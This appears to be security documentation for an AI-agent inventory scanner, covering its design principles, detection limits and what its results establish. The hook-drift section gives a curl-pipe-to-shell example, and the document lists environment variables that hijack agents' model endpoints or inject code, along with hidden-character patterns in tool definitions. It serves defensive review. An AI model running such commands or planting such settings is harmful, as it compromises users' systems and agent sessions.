# Security model

Nexus SymBiote connects an agent's inventory to evidence and policy. Keep the following states separate:

| State | Meaning |
| --- | --- |
| Declared composition | A repository, supplier, or configuration says a component is used. |
| Observed composition | A named collector measured a component in a stated scope and time. |
| Approved configuration | An authorized approver accepted a specific configuration and capabilities. |
| Mediated execution | An enforcement adapter checked an actual action against its trusted policy and approval. |

Nexus-ShadowScan is the primary discovery source; importing its report into Nexus SymBiote preserves the distinction between a supplied claim and a new local measurement. A2A Agent Cards, IDE configuration, and extension manifests are declarations until their relevant identity and evidence are separately verified.

An inventory entry never grants permission by itself. A schema hash pins an interface; it does not constrain a backend's hidden side effects. A signed malicious artifact remains malicious. Runtime metadata emitted by the agent itself has a different trust basis from an independent observation.

Collectors must preserve coverage limitations, denied reads, unsupported inputs, exclusions, and failures. Missing information means unknown, not verified absence. Secrets are references, not values. Avoid default capture of raw prompts, retrieved documents, tool arguments, or results. Tenant and deployment identifiers must remain part of approval and observation scope.

## Design principles

1. **Never runs what it inspects.** Collection is static. It does not execute project modules, model loaders, repository hooks or MCP launch commands.
2. **Offline by default, enforced at run time.** Every command refuses name resolution, network connections and process creation unless you opt into live mode for one of three commands.
3. **Unknown is not safe.** Missing evidence, failed reads and skipped collectors are recorded as gaps, and default gates fail on them instead of passing silently.
4. **Claims are not evidence.** Declared, observed, approved and mediated states stay separate. A supplier label or an adjacent signature file never upgrades trust by itself, and `--no-project-policy` stops an untrusted checkout from choosing its own gates.
5. **Standards first.** One native inventory exports to CycloneDX 1.7, SPDX 3.0.1, SARIF 2.1.0 and VEX. Standard exports carry the full native inventory in a digest-bound extension, so a consumer that keeps it loses nothing.

When a supplier gives you an inventory and you have the corresponding checkout,
use both commands against the same project root.

```sh
nexus-symbiote validate inventory.json --project /reviewed/checkout --no-project-policy
nexus-symbiote risk inventory.json --project /reviewed/checkout --no-project-policy --json-output
```

Project reconciliation reruns the supported static collectors and compares
their components, findings and repository relationships with the supplied BOM. A mismatch
makes the project-backed risk command exit unsuccessfully with an unknown risk
level and a null score. A supplied component that no collector produced, such
as a tool recorded by `verify-live --record`, is supplementary when it has
claims but no local path and no claim scoped to the repository, a source
declaration or dependency resolution. Reconciliation keeps it with its own
provenance and does not verify it, so it can be linked to local subjects only as
that command links a tool served by a local MCP server: through the tool's
`mcp_server_ref`, that server's or an agent's `tool_refs`, and a `provides-tool`
record from that server that claims no more assurance than the tool's own
claims. That record's `conditions` text is kept as supplied and is not evidence
of a control; whether to accept only the text that `verify-live --record` writes
remains a maintainer decision. Any other reference or dependency record between
a local subject and a supplementary component fails reconciliation. So does
`verified` assurance in a supplied component, claim, dependency record or
completeness claim, or an `internal-verified` or `third-party-signed` trust tier
on a supplementary component, because no offline check establishes them.
Deployment-profile authority claims and evidence records are the exception: they
keep their producer-reported state, including `verified`, as supplied and not
verified; see [deployment-scoped authority claims](deployment-evidence.md).
Carrying that state is what a profile is for, so whether reconciliation should
reject it too remains a maintainer decision. Otherwise, fields and claims that no
collector populates, and relationships among supplementary components, are
accepted as supplied and not verified.

Without `agent.yaml`, the repository agent's reference and name derive from the
checkout path, so reconciliation takes both from the supplied BOM and compares
only the agent's contents and relationships; its name is not evidence. `scan`
records absolute `source_path` values, so a supplied BOM reconciles with a moved
or renamed checkout only when those paths are relative to the project root.

Without a project, `risk` scores the supplied claims
and labels the result `supplied-bom`. For an operator-configured signature
check, supply the trusted signer policy when validating the project. Each entry
must match a collected model and verify under the specified identity and issuer.
An unsupported model, an excluded model or an invalid signature fails the gate,
even if other files have valid hashes. A project policy cannot weaken a supplied
signer policy: `scan` rejects one that deselects the model scanner, or that
selects `failure_mode: report-only` unless you also pass `--report-only`, and
`validate` rejects one that disables integrity validation. `scan` writes the
inventory and its recorded failures whether or not the gate passes;
`--report-only` returns exit status 0 instead of 1 so you can inspect them.

A mediated action needs a trusted approver, snapshot binding, authenticated workload and endpoint, action/resource constraints, validity, current revocation state, rollback protection, and any action-specific approval. One-use approval must bind to the action and arguments it authorizes. Adapter checks cannot govern tools invoked through an unmediated route; deployments need their own network, identity, and sandbox controls to make mediation complete.

For hosted models, an alias is a locator. Provider-reported revisions and behavioral canaries do not establish measured weight identity. Preserve identity assurance and unknowns explicitly. For retrieval and memory, record the source and index versions, effective reader/writer permissions, and derived records requiring invalidation after withdrawal.

Static A2A cards and client declarations require an operator-keyed source binding
for complete value coverage. The exported origin and authentication Boolean do
not describe endpoint paths, credentials, scopes or scheme definitions. Their
canonical source is bound by HMAC without exposing it; the same operator key is
required for candidates and project reconciliation. Missing keys, legacy or
incompatible bindings and unknown authentication forms leave coverage unknown.
Drift checks require review for unbound snapshots even when their public fields
match. See [source binding and migration](verification-source-binding.md).

## Known false-positive and false-negative classes

These are current behaviors, not guarantees. Review them before relying on a gate.

- **Model format by name and content.** `.pkl`, `.pickle`, `.pt`, `.pth`, `.bin`, `.joblib`, `.dill`, `.ckpt` and `.pdparams` files, compressed pickle and joblib dumps such as `.pkl.gz` and `.joblib.xz`, and dotfiles with those names are rated as potentially code-executing on file name alone, before any content is read. A non-pickle `.bin` file (firmware, game data) is therefore a critical finding, which fails the default gate; `.sav` is not collected, because most such files are statistics data. A `.keras` archive is rated code-executing when its `config.json`, parsed as Keras parses it, carries a Lambda layer or a function outside the Keras packages (`keras`, `tf_keras`, `keras_hub`, `keras_nlp`, `keras_cv`; a `builtins` function only when it names a Python builtin), or when the archive holds a pickle member, duplicate member names, more than 10,000 members, a configuration over 16 MiB or more inspection reads than 24 MiB. Classes from extension libraries such as KerasHub are not flagged, `.npz` weight members are not inspected (Keras 3.0 to 3.8 loaded them with pickle allowed), and function references inside the Keras packages are not flagged. Keras HDF5 files stay unknown: without an HDF5 parser their configuration cannot be read, and whether a legacy full model runs Lambda-layer code depends on the loader (Keras 3.0.0-3.11.2 do, even in safe mode; CVE-2025-9905). Every `.h5` and `.hdf5` file, including h5py datasets and pandas HDFStore files, is inventoried; the evidence names a Keras model configuration or weights when their attribute names occur. Formats with no structural validator (`.onnx`, `.gguf`, `.ggml`, `.h5`, `.hdf5`, other `.keras` archives and TensorFlow's `saved_model.pb`) are reported as unknown, not safe. Each such file carries two high findings, for the format and for the missing signer policy, so four of them exceed the default score threshold; `validate` fails on any one of them. A SavedModel's hash covers only `saved_model.pb`: its `variables/` and `assets/` are not inventoried, so replacing only the weights produces no drift. Other `.pb` files are generic protobuf data and are not collected. Formats outside these lists, such as NumPy `.npy` and `.npz` arrays, are not inventoried, and protocol 0 or 1 pickles under non-pickle names are reported unknown rather than code-executing.
- **MCP launcher names.** `npx`, `bunx`, `uvx`, `pipx` and `docker` are recognized by file name in any letter case, ignoring a directory or drive prefix and a `.exe`, `.cmd`, `.bat` or `.ps1` suffix, so `/usr/local/bin/npx` and `npx.cmd` get the same pinning findings as `npx`. A launcher named by a path gets no registry package identity, because the path can select any executable; the server records `launcher_path_qualified` instead. A launcher started through a wrapper gets the same checks: the command line after `-c` for `sh`, `bash`, `dash`, `zsh`, `ksh`, `ash`, `mksh`, `oksh`, `loksh`, `yash`, `posh`, `fish`, `csh` and `tcsh`, including combined flags such as `-lc`; after `/c` or `/k` for `cmd`, in any letter case; after `-Command` or `-c`, or decoded from `-EncodedCommand`, for `powershell` and `pwsh`, with an option written after `-`, `--`, `/` or an en dash, em dash or horizontal bar as PowerShell accepts, and a bare first argument for `powershell` (`pwsh` runs a bare first argument, like `-File`, as a script, which gets no finding); an encoded command is decoded as .NET does, ignoring spaces, tabs and line breaks, and one that does not decode is searched as far as it can be decoded; and the command after the assignments and options of `env`, including `env -S`. Leading `NAME=value` assignments and `exec` in a POSIX shell line, and assignments for `env`, are skipped; `cmd` and PowerShell run a first word such as `name=x` as a program, so a launcher after it is undetermined, and wrappers may nest up to four deep. The server records the wrapper's name in `launcher_wrapper`, never the wrapped line, and a path anywhere in the chain, as in `/usr/bin/env npx`, withholds the registry identity. The line is only split into words, never expanded: when it holds a pipe, `&&`, `;`, a redirection, a newline, command substitution, a variable, a glob or brace pattern, quoting the split does not model, an unknown wrapper option, another program before the launcher such as `nohup npx` or `nohup sh -c 'npx ...'`, or more than 4096 characters, and it names a package launcher anywhere, the server gets the high finding below saying its package could not be determined. The name is also searched with the shells' quote, escape and bracket characters removed, so `n\px`, `n"p"x`, `n^px`, `` n`px `` and `np[x]` count as naming `npx`; a glob such as `np*` or `n?x` does not. A configured command that is not a wrapper or launcher, such as `nohup`, `timeout 3600`, `busybox sh -c` or `dotenv --`, gets the same finding when its arguments name a package launcher as a word or a wrapper whose line names one; the server records the program in `launcher_wrapper` when it is a known prefix program such as `nohup`, `nice`, `timeout`, `sudo` or `busybox`, and `[redacted-command]` otherwise. A launcher name as an argument value counts too, as in `node app.js --tool npx`, except `docker` when no `run` follows it, so `--runtime docker` and a `docker` directory in a path get no finding. This includes a quoted variable or extras such as `'pkg[cli]==1.0'`, which the split cannot tell from unquoted ones. Registry and index options such as `--index-url` or `--registry` in a wrapped line, readable or not, are bound by `static_config_hash` like those of a direct launcher. A wrapped line that names no launcher, such as `sh -c "node server.js"`, or a launcher whose name the line computes, such as `sh -c '$TOOL pkg'`, gets no pinning finding. The package reference is read after the launcher's known options: `-y`, `-q`, `--` and `-p` or `--package` for `npx` and `bunx`, and for `docker run` common flags and value-taking options such as `-e`, `-v`, `--name` or `--pull`, whose values are skipped and never recorded. When any other option comes first, or the reference cannot be read, the server gets a high `version_pinning` finding saying its package could not be determined, and no registry identity. For `docker` this includes `docker container run` and a `run` after global options such as `--debug` or `-H`; because the value of a global option cannot be told apart from a subcommand, any `run` after an option gets the finding unless `compose` comes before it. Other `docker` subcommands, such as `compose` or `pull`, get no pinning finding.
- **MCP tool side effects.** The side-effect profile comes from substrings of the tool name, so `get_dropdown_options` is rated destructive while a destructive tool with a neutral name such as `cleanup` is not, nor is one whose name uses look-alike or fullwidth letters, such as a Cyrillic `е` in `dеlete_all_files`; descriptions are not considered. A tool's own `destructiveHint` can raise the profile to destructive, but its `readOnlyHint` never lowers it, and a tool whose name matches no pattern stays unknown.
- **Hidden characters in MCP tool definitions.** Bidirectional controls and Unicode tag characters in a configured tool's name, description, input schema or annotations are critical findings, and other invisible, format or control characters are high, matching the instruction-file severities. Findings name the affected fields, never the text. A zero-width joiner between emoji is treated as normal text, and so is a single variation selector after a character that has variants of that kind: an emoji, a digit, `#` or `*` that starts a keycap sequence, a CJK ideograph, a Mongolian letter, or a character of a kind with standardized variants: mathematical operators, Egyptian hieroglyphs, and Myanmar, Phags-pa and Manichaean characters. Each such character can still carry a few unreported bits, and a CJK ideograph almost one byte, because any of 240 ideographic variation selectors may follow it. Selectors anywhere else are reported, including after blank characters such as U+2800 and after ordinary text, and so are rare standardized variants such as the slashed zero or the fullwidth forms of curly quotation marks and CJK punctuation. Tag characters are reported even inside emoji flag sequences, and so are zero-width joiners and non-joiners in scripts such as Devanagari or Persian. Left-to-right, right-to-left and Arabic letter marks (U+200E, U+200F, U+061C), Arabic number signs (U+0600 to U+0605) and zero-width joiners in Sinhala and Malayalam conjuncts are also high `invisible_characters` findings, so right-to-left tool descriptions and instruction files can produce false positives; whether to stop reporting these marks is a maintainer decision. Other tool fields, server names and arguments, and descriptors observed by `discover-mcp` or `verify-live` are not checked. Instruction files such as `CLAUDE.md` follow the same rules, except that a byte order mark at the start of the file is not reported.
- **Risk score scale.** The aggregate score is the uncapped sum of finding weights (critical 10, high 7, medium 4, low 1). It grows with inventory size and is not a percentage, although the Action accepts thresholds from 0 to 100. Any critical finding fails the default gate regardless of the aggregate.
- **Claude Code hooks and settings commands.** Every command and HTTP hook is a high finding, including formatters, linters and logging endpoints, whatever `disableAllHooks` declares, and so is every settings command: `apiKeyHelper`, `awsAuthRefresh`, `awsCredentialExport`, `gcpAuthRefresh`, `otelHeadersHelper`, and the `command` of `statusLine`, `fileSuggestion` and `subagentStatusLine`. A hook is flagged even where the Claude Code version in use skips it, such as a hook with an `if` condition on an event other than a tool event, which versions without `if` support run on every event, or an HTTP hook on `SessionStart` or `Setup`. A handler declared in both settings files is recorded and flagged once per file, although Claude Code runs it once. Prompt and agent hooks are recorded without a finding, because their output can only block an action or return a reason that Claude reads as its next instruction, although an agent hook's subagent reads repository files. MCP tool hooks are medium findings because the server must already be configured, and their effect depends on that server's tools. Only the two project settings files are read, together with files whose names differ from them only in case, such as `.claude/Settings.json`, because the default macOS and Windows file systems open those under the documented name. When several files fold to one settings layer, which can happen only on a case-sensitive file system, all are read as layers: hooks, settings commands and allowances are the union, and the last file's `permissions.defaultMode` is recorded, although Claude Code on Linux reads only the exact name. User, managed, plugin, skill and subagent hooks and the hooks of other agents such as Cursor are not collected. At most 1000 hook declarations from at most 8 settings files are inventoried, with at most 64 names in each `allowedEnvVars`, header and `httpHookAllowedEnvVars` list and 2048 `allowedEnvVars` and header names across all handlers; more leave coverage unknown, and a name list over a bound is recorded as `[unparsed]`.
- **Claude Code settings `env`.** Claude Code writes the `env` block of each settings file into its own environment, so every Bash command, hook, settings command and stdio MCP server it starts inherits it. Each file's variable names are recorded, sorted, in `declared_settings_env`; values never are. Names that inject code into or redirect the commands Claude Code runs are a high `agent-settings-env-exec` finding: dynamic loader variables (`LD_*`, `DYLD_*`), interpreter options and search paths such as `NODE_OPTIONS`, `PYTHONPATH`, `PYTHONSTARTUP`, `PERL5OPT` and `RUBYOPT`, shell startup and selection such as `BASH_ENV`, `ENV`, `PATH`, `CLAUDE_CODE_SHELL`, `CLAUDE_CODE_SHELL_PREFIX` and `CLAUDE_ENV_FILE`, git commands and configuration such as `GIT_SSH_COMMAND`, `GIT_CONFIG_*`, `GIT_DIR`, `GIT_COMMON_DIR` and `GIT_WORK_TREE`, the configuration roots `HOME` and `XDG_CONFIG_HOME`, from which git reads commands such as `core.fsmonitor`, helper commands such as `EDITOR`, `VISUAL`, `PAGER`, `MANPAGER`, `LESSOPEN` and `GIT_SEQUENCE_EDITOR`, `GCONV_PATH`, `PYTHONWARNINGS`, `PERL5DB`, configuration files that run credential or exec plugins such as `AWS_CONFIG_FILE`, `KUBECONFIG` and `DOCKER_CONFIG`, package manager configuration (`NPM_CONFIG_*`, also as `npm_config_*`, and `PIP_*`), and `BASH_FUNC_*` names, which Bash imports as functions that replace a command; a `BASH_FUNC_` name is shown as `BASH_FUNC_*`. Names that redirect the model endpoint, its credentials, the network proxy or TLS trust, or that export the conversation as telemetry, are a high `agent-settings-env-endpoint` finding: `ANTHROPIC_*BASE_URL`, `ANTHROPIC_API_KEY`, `ANTHROPIC_AUTH_TOKEN`, `ANTHROPIC_CUSTOM_HEADERS`, the `CLAUDE_CODE_USE_*` provider switches, `CLAUDE_CODE_SKIP_*_AUTH`, `CLAUDE_CODE_OAUTH_TOKEN`, `HTTP_PROXY`, `HTTPS_PROXY`, `ALL_PROXY`, `NO_PROXY`, `NODE_EXTRA_CA_CERTS`, `NODE_TLS_REJECT_UNAUTHORIZED`, `REQUESTS_CA_BUNDLE`, `CURL_CA_BUNDLE`, `GIT_SSL_NO_VERIFY`, `AWS_ENDPOINT_URL*`, AWS and Google credential variables such as `AWS_ACCESS_KEY_ID`, `AWS_PROFILE` and `GOOGLE_APPLICATION_CREDENTIALS`, `CLAUDE_CODE_ENABLE_TELEMETRY`, the OpenTelemetry exporter and content variables (`OTEL_*EXPORTER*`, `OTEL_EXPORTER_*`, `OTEL_LOG_*`) and `BETA_TRACING_ENDPOINT`, among others. Current Claude Code releases ignore some of these, such as `HOME`, `XDG_CONFIG_HOME`, `CLAUDE_CODE_OAUTH_TOKEN` and the telemetry exporter variables, in project and local settings, but earlier releases apply them, so they are still flagged. They are high rather than medium because the endpoint or proxy receives every prompt, file and tool result in the conversation and writes the replies that become tool calls, as an HTTP hook would; a telemetry collector receives copies of prompts and tool details but cannot write replies. The lists are a denylist and cannot be complete: another variable that makes a tool load attacker-controlled configuration, such as one of the many `YARN_*`, `UV_*` or `CARGO_*` settings, is recorded without a finding, and a change to its name is drift but a change to its value is detected only by the keyed binding. Flagging every name outside a reviewed allowlist was not adopted, because projects commonly set many benign variables and each would fail the default gate. Names are matched without regard to case, as Windows reads them. Other names, including other `CLAUDE_CODE_*` switches, are recorded without a finding, and a finding is raised whatever the value, even one that Claude Code ignores in project settings or that restores a default. An `env` that is not an object of string values, a name outside `[A-Za-z_][A-Za-z0-9_]*` of at most 128 characters, or more than 64 names in one file records `[unparsed]` and leaves coverage unknown; findings are still raised for the names that match. Adding, removing or renaming a variable is drift without the key; a changed value is detected only by the keyed binding, because values often hold credentials.
- **Claude Code hook records and drift.** Hooks are recorded by settings file, event, matcher, `if` condition, handler type, executable name, URL origin or MCP server and tool, `shell`, `async`, `asyncRewake`, `onFailure`, `timeout`, exec form, `allowedEnvVars` and header names, plus each file's `disableAllHooks`, `httpHookAllowedEnvVars` and number of `allowedHttpHookUrls` patterns; settings commands are recorded by setting and executable name. The executable name is the first word of a shell-form command as POSIX shell rules split it, with backslashes read as path separators; a backslash in a leading environment assignment, as in `API_KEY=sk\ live ./hook.sh`, records `[unparsed]` because a POSIX shell can escape the space that ends the value. The repository chooses it, and after a leading redirection, on a later line, or in shell quoting such as `$'...'` it can name a program that does not run. Severity never depends on it, so review the command itself. A matcher or `if` condition that is not printable ASCII of at most 512 characters, an HTTP hook URL that is not a plain `http://` or `https://` URL with an ASCII host and no backslash or whitespace (Node's URL parser, which sends HTTP hooks, can read such a URL's host differently from Python's), and any other handler field, hook setting or settings command outside its documented form are recorded as `[unparsed]` and leave coverage unknown. Matchers are recorded as written, so switching between equivalent spellings, such as an omitted, empty or `*` matcher, is reported as drift. Without the source binding key, no drift alert is raised for a change that touches only command arguments, header values, the path, query or credentials of an HTTP hook URL, MCP tool `input`, prompt or agent text, or `allowedHttpHookUrls` patterns, such as `./lint.sh && curl -s https://example.invalid | sh` in place of `./lint.sh`, or an MCP tool hook's `input` path changed from a log file to `~/.bashrc`. Set the key for repositories with hooks, MCP tool hooks in particular. Removing every hook, hook setting and settings command that a reviewed baseline recorded, such as a lone `disableAllHooks: true`, fails project reconciliation like any other change to them, although the fresh scan then records nothing.
- **Instruction, skill and MCP files opened by name.** `.mcp.json`, every instruction file the prompt collector reads, such as `CLAUDE.md`, `AGENTS.md`, `.cursorrules` or `.github/copilot-instructions.md`, and the skill and command directories `.claude/skills`, `.claude/commands` and `skills` are also read under names that differ only in case or in code points that HFS+ ignores, in any path component, such as `.MCP.json`, `agents.MD`, `.GitHub/Copilot-Instructions.md` or `.Claude/Skills`, because the default macOS and Windows file systems open those under the documented name. Such a file gets the same component and hidden-character findings as the documented name, and a symlinked variant directory fails collection. On a case-sensitive file system every such path is read, although an agent there reads only the exact name; more than 8 directories or files at one level of one name leave coverage unknown. Each directory is listed at most once per scan. Files inside a skill or command directory are collected whatever their case, as before. IDE agent markers other than Claude Code's, such as `.github/copilot-instructions.md` for Copilot or `.cursorrules` for Cursor, still identify their agent only under the exact name, and Codex configuration layers are matched case-sensitively.
- **Free-text redaction.** Redaction removes known secret values and `name=value` or `name: value` pairs whose name contains `api_key`, `access_key`, `secret_key`, `private_key`, `token`, `password`, `passwd` or `secret`. Credentials in other shapes, such as quoted JSON keys or values containing spaces, are not recognized by pattern; structured collectors rely on scrubbing known environment values instead.
- **Root-relative configuration discovery.** The `mcp`, `prompt`, `registry`, `a2a` and `ide_agents` collectors read their configuration files from fixed paths relative to the scanned directory, such as `.mcp.json`, `CLAUDE.md`, `package.json`, `Dockerfile`, `.well-known/agent-card.json` and `.claude/settings.json`. An agent whose configuration sits in a subdirectory of the scanned path, as in a monorepo, is not discovered, yet those collectors report complete coverage, the completeness check passes, and the default scan gate can pass. Model files and retrieval configuration are found anywhere in the tree, and the `mcp` collector also searches Python and TypeScript sources for MCP server and tool declarations. Scan each agent's own root.
- **Fixed manifest names.** The `registry` collector reads `requirements.txt`, `requirements-dev.txt`, `requirements-ml.txt`, `pyproject.toml` (PEP 621 and Poetry dependencies), `package.json` with an npm `package-lock.json` (lockfile version 2 or 3), `Dockerfile`, `Dockerfile.agent`, `docker-compose.yml` and `docker-compose.yaml`, all at the scanned root. Other requirement files, such as `requirements-prod.txt` or `requirements/base.txt`, and other lockfiles, such as `poetry.lock`, `uv.lock`, `yarn.lock` or `pnpm-lock.yaml`, are not read, and the collector still reports complete coverage.
- **Hosted CI.** A configured workflow is not evidence that it ran; see `docs/repository-controls.md`.

## What results do and do not establish

A successful scan is an inventory result. It does not establish that a model is benign, that a tool backend obeys its description, or that every agent action was mediated. Inspect the exit status and the inventory's coverage, exclusions and failures: a command may write evidence and still return a failing gate, and exit code `0` for informational commands, report-only output and skipped gates does not establish approval.

Collection is static by default and does not execute project modules, model loaders, hooks or MCP launch commands. A completed search can find no matching files; unsupported declarations and failed reads remain coverage gaps, and collectors omitted from `--scanner` remain unknown. Configuration paths are matched case-sensitively. Hosts on case-insensitive filesystems, the macOS and Windows defaults, also load case variants such as `.Codex/config.toml` or `.Claude/settings.json`, which the collectors neither record nor report. Configuration presence does not prove that a server is running or that its live tool definitions match the declaration. `verify-live` is a separate explicit execution operation requiring an independently pinned launcher policy and external isolation, and `discover-mcp` is an explicit HTTPS observation operation. Neither calls tools.

For trusted local projects, standalone `scan`, `validate` and `risk` load project policy by default. Pass `--no-project-policy` when the scanned checkout must not choose your verification policy. Standalone ShadowScan imports require a new output path and retain partial coverage; `--report-only` is an explicit inspection mode. Imported discovery remains a source claim and does not establish deployment, effective access or authorization.

| Capability | Evidence and limitation |
| --- | --- |
| ShadowScan integration | Exact source-report digest, mapped components and supported declared edges, with unmapped indexes and projection limits; no automatic producer authentication or trust upgrade |
| MCP and tools | Scoped client/server references and supported source declarations; runtime descriptors and backend behavior need separate evidence |
| Model integrity | Whole-file hashes, bounded format inspection, SafeTensors metadata fingerprints and optional Sigstore checks; a format, header fingerprint or signature does not prove benignness |
| Instructions and skills | Source-bound artifacts and suspicious-content findings; detection is limited to supported files and patterns |
| Retrieval and registries | Declared configuration, package identities and lineage references; presence does not establish actual installation or retrieval ACL enforcement |
| A2A and IDE declarations | Agent Cards, host settings and extension declarations; supplier labels are not proof of endpoint identity, execution or signature validity |
| Runtime contracts | Ed25519-signed snapshots, approvals and trust status bound to authenticated context in a reference adapter; deployments must prevent bypass and protect state |
| Impact analysis | Potential graph reachability through recorded relationships, not proof that an exploit executed |
| GitHub Action | One collected inventory, caller-owned gates and optional SARIF upload; disabled or skipped gates are visible policy choices |

A2A v1 cards retain the preferred interface and ordered alternatives from
`supportedInterfaces`, including each origin, protocol binding and version.
A change to a recorded interface or to declared card or skill security requirements
raises a high-severity drift alert. URL userinfo, paths, queries, fragments and
opaque tenant values are omitted from the export. Only the keyed source binding
above covers them: with the operator key, a same-origin path or tenant change
raises a high-severity alert; without it, the card is partial coverage and the
default gates fail. Authentication requirements describe the card's declarations.
Verifying the remote endpoint and its enforcement requires separate evidence.

Project validation compares static MCP records and configured tool fingerprints with fresh local evidence. A structure binding detects added or removed arguments, environment variables and tools. With `NEXUS_SYMBIOTE_SOURCE_BINDING_KEY` set, a keyed binding also detects same-version package swaps and changed argument, environment and endpoint values, without exporting anything a secret could be guessed from. MCP references include the relative configuration path and declared name. Legacy snapshots without the binding, or with name-only identities, need recollection; see [source reconciliation and migration](verification-source-binding.md). Python source declaration collection has bounded application-file coverage and reports unresolved or dynamic registrations as gaps.

Codex loads a `.codex/config.toml` from each directory between the project root
and its working directory. The collectors read every one in the project, up to
16 layers (more are a collection failure), and evaluate each directory with the
layers above it, never with a sibling's. As in Codex, the layers are merged
table by table, so a package layer may override a single field of a root MCP
server or approval policy; only a merged value that Codex would refuse is a
collection failure. The IDE record keeps each layer's own sandbox mode, approval
policy and reviewer, `default_permissions`, `[permissions]` profiles and
`[sandbox_workspace_write]` settings. Only identifier-like permission profile
names, matching `[A-Za-z0-9_][A-Za-z0-9_.-]{0,63}`, reach the inventory: Codex
also accepts names with spaces, non-ASCII names and longer names, but the
collectors record those as collection failures so that arbitrary text stays out
of the BOM. As in Codex, a layer's `default_permissions`
takes precedence over its `sandbox_mode`. Full access by any route and writable
paths outside the project are high-severity findings. Codex refuses a profile
that extends a built-in other than `:read-only` or `:workspace`, such as
`:danger-full-access`, so such a profile is a collection failure. Codex writes to the target of a symlinked
writable root. The collection fails on a symlink anywhere in the project except
inside the directories it never enters (`node_modules`, `.git`, `__pycache__`,
`venv` and `.venv`), so a writable or workspace root through one of those leaves
coverage incomplete. Sandbox network access, and workspace writes with every
approval prompt disabled, are medium-severity findings. Codex loads project
layers only for trusted projects and gives them `:workspace` writes when no layer
selects a sandbox, so disabling every prompt without a sandbox selection is the
same finding. A Codex MCP server
declared in a nested layer is recorded with the layers it merges. Server records
keep tool approval modes, tool allow and deny lists, OAuth scopes, the stdio
working directory and the names of forwarded environment variables (`env_vars`,
`env_http_headers` and `bearer_token_env_var`). An `http_headers_helper` command
is recorded by its argument count, and by its program only when that is a known
launcher, as for a stdio command. These names are redacted only against secret
values of at least 8 characters, and distinct names that redaction would merge
are a collection failure. The structure binding covers all of these
without the operator key; other values, such as the helper's arguments, are
bound only by the keyed binding. Values the collectors cannot validate are
collection failures, and settings they do not interpret, such as profile network
proxy rules, `hooks`, `auto_review`, `[apps]` and a `.codex/hooks.json` file,
leave coverage incomplete. Codex reads `hooks.json` from every project `.codex`
folder, so one without `config.toml` still identifies Codex. With the operator
key, the values of these settings are bound, so an edit to them fails the drift
gate; settings that RFC 8785 cannot canonicalize are a collection failure. Codex TOML
larger than 256 KiB, nested more than 32 levels or with more than 16 unquoted
dots on one line is recorded as a collection failure without being parsed. The
registry collector applies the same limits to `pyproject.toml`. Within these
limits, parsing sixteen maximum-size layers can take each collector several
CPU-seconds, and `scan`, `validate --project` and `risk --project` each run both
Codex collectors.
Redacting each MCP server's recorded names, strings and tool descriptors against
its secret values, and resolving and checking permission profiles, are bounded
over the collection (400 million character-by-secret checks for Codex layers
and again for JSON configurations, each string weighing its length plus 100,
and 2 million grant entries); past either
bound the collection fails instead of running for minutes. User, managed and
runtime settings and project trust remain unobserved.

Integrity validation reports a tool descriptor's internal consistency separately
from a fresh local configuration match. A matching digest contained only in the
supplied BOM is not source evidence and leaves integrity unknown, including when
other artifact hashes match. Configured tools can be corroborated with `--project`;
tools lacking a matching supported configuration remain unknown. Such local
matches do not authenticate the BOM, checkout, producer or a live endpoint. Use
independent signer and source policy when those properties are needed.

CycloneDX 1.7 and SPDX 3.0.1 exports use supported standard structures and a digest-bound native extension. Consumers must retain that extension to recover full native semantics and inspect the selected-field loss report. A digest detects changes; it does not authenticate the producer. SPDX identities are scoped to each inventory revision. SARIF contains reviewable findings rather than an admission decision, and standalone ShadowScan imports do not support SARIF. VEX output marks findings `in_triage` and does not assert exploitability. Schema validity alone establishes neither semantic equivalence nor complete collection.

Inventories can expose infrastructure, permissions, source references and instruction fingerprints. Restrict evidence access and retention, and review artifacts before sharing them. Use independent expected digests and signer/issuer policies; a signature or registry label does not establish content safety. IDE permission records describe collected project declarations: Claude's `permissions.defaultMode` and broad tool allowances are retained, while user/managed policy, workspace trust, deny/ask precedence and session flags remain outside effective-authorization verification. Claude Code hooks in `.claude/settings.json` and `.claude/settings.local.json` are recorded by settings file, event, matcher, `if` condition, handler type, the fields that decide how they run, and executable name, URL origin or MCP server and tool, and settings commands such as `apiKeyHelper` by setting and executable name; command lines, arguments, header values, inputs, prompts and allowlist patterns are not exported. Claude Code runs these hooks and commands without per-call approval, and `-p` and SDK sessions never ask for workspace trust, so command and HTTP hooks and settings commands are high findings, MCP tool hooks are medium findings, and prompt and agent hooks are recorded without a finding. With `NEXUS_SYMBIOTE_SOURCE_BINDING_KEY` set, a keyed binding also detects changed arguments, header values, inputs, prompts and allowlist patterns. A hook declaration with an undocumented structure or handler type is a collection failure, and so is a hook value the keyed binding cannot canonicalize, such as a lone surrogate or a number outside I-JSON; the other hooks are still recorded. Scanner failures emit application-owned diagnostic codes; raw exception text and invalid model configuration values are omitted from failure reports.

The security and inventory benchmark corpora are finite regression cases. They establish no representative field accuracy, complete collection or percentile ranking.
